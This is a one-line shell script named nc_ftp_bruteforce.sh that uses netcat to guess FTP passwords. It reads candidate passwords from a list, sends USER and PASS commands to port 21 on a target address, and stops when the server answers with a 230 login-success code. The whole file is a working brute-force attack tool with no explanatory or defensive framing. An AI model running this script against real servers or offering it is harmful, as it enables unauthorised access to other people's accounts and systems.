#nc_ftp_bruteforce.sh
cat list|while read lines;do echo "USER $USERNAME">ftp;echo "PASS $lines">>ftp;echo "QUIT">>ftp;nc $IP 21 <ftp>ftp2;echo "trying: $lines";cat ftp2|grep "230">/dev/null;[ "$?" -eq "0" ]&& echo "pass: $lines" && break;done
